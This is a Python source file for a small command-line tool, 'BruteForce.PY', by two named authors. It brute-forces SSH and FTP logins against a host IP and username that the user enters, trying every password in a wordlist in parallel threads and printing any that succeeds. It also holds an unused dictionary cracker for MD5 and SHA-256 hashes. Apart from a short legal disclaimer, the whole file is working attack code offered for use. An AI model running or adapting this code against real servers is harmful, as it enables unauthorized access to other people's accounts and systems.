#!/usr/bin/env python
#
# BruteForce Script Version 1.0.0 (2022)
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool. The author accepts no liability for
# damage caused by this tool.  If these terms are not acceptable to you, then do
# not use this tool.
#
# by Pierre CHAUSSARD & Nathan TEBOUL
#
# 24-Feb-2022 - 1.0.0 - Creating basic script.
#

import pyfiglet,sys,time,hashlib
import paramiko
from threading import Thread
from ftplib import FTP

def section_print(title):
        print("\n" + "=" * 50)
        print(title)
        print("=" * 50 + "\n")

def hash_cracker(wordlist, type, input):
        with open(f"wordlists\{wordlist}", 'r', encoding="utf8") as file:
                start = time.time()
                for line in file.readlines():
                        if type == 'md5':
                                hash_ob = hashlib.md5(line.strip().encode())
                        elif type == 'sha256':
                                hash_ob = hashlib.sha256(line.strip().encode())

                        hashed_pass = hash_ob.hexdigest()
                        if hashed_pass == input:
                                end = time.time()
                                print(f"Hash Cracker\n |  Wordlist : {wordlist}.\n |  Hash Type : {type}.\n |  Hash : {input}.\n |  Password founded : {line.strip()}\n |_ Time elapsed : {end - start}s.")
                                exit(0)

def menu():
        ascii_banner = pyfiglet.figlet_format("BruteForce.PY")
        print(ascii_banner)

        x = int(input("Choose your service :\n 1. SSH.\n 2. FTP.\n\n>"))

        if x == 1:
                #print(ssh_connect('10.3.214.103', 'user', 'user'))
                section_print("SSH BruteForce")
                ip = str(input("Enter SSH IP :\n>"))
                user = str(input("Enter username :\n>"))
                wordl = str(input("Enter wordlist :\n>"))
                ssh_bruteforce(ip,user,wordl)
        elif x == 2:
                section_print("FTP BruteForce")
                ip = str(input("Enter FTP IP :\n>"))
                user = str(input("Enter username :\n>"))
                wordl = str(input("Enter wordlist :\n>"))
                ftp_bruteforce(ip,user,wordl)

def ssh_connect(ip, username, password, port=22):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port, username, password)
        print("Mot de passe: " + password)
        return True
    except:
        return False

def ssh_bruteforce(ip, username, wordlist):
    arr = []
    with open(f"wordlists\{wordlist}.txt", 'r', encoding = "utf8") as file:
        for line in file.readlines():
            th = Thread(target = ssh_connect ,args = (ip, username, line.strip()))
            th.start()

def ftp_connect(ip, user, password):
        try:
                FTP(ip, user = user, passwd = password)
                print("Mot de passe: " + password)
                return True
        except:
                print("echec: " + password)
                return False

def ftp_bruteforce(ip, username, wordlist):
    arr = []
    with open(f"wordlists\{wordlist}.txt", 'r', encoding="utf8") as file:
        for line in file.readlines():
            th = Thread(target=ftp_connect ,args=(ip, username, line.strip()))
            th.start()

try:
        menu()

except KeyboardInterrupt:
        print("\n/!\ Exiting Program !")
        sys.exit()
